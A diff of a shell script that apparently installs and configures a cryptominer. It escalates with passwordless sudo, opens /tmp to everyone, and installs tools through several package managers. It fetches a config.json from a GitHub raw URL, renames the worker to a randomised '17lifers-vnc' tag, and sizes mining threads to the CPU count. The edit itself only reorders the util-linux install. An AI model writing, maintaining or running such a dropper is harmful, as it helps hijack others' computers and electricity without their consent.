@@ -10,11 +10,11 @@ else
     sudo -n chmod 777 /tmp
 fi
 
-# try to install wget
+# try to install wget and util-linux
 sudo -n apt update
-sudo -n apt install -y wget
-sudo -n apk add wget
-sudo -n dnf install wget
+sudo -n apt install -y wget util-linux
+sudo -n apk add wget util-linux
+sudo -n dnf install wget util-linux
 
 if command -v wget >/dev/null 2>&1; then
     DOWNLOAD_CMD="wget"
@@ -53,9 +53,6 @@ $DOWNLOAD_CMD https://raw.githubusercontent.com/spetterman66/verynicerepo/main/c
 randnum=$(( RANDOM % 1000 + 1 ))
 sed -i "s/17lifers@home/17lifers-vnc-$randnum/g" config.json
 
-sudo -n apk add util-linux
-sudo -n apt install -y util-linux
-sudo -n dnf install util-linux
 num_threads=$(lscpu | grep "^CPU(s):" | awk '{print $2}')
 
 # generate the replacement string with -1 repeated num_threads times, separated by commas
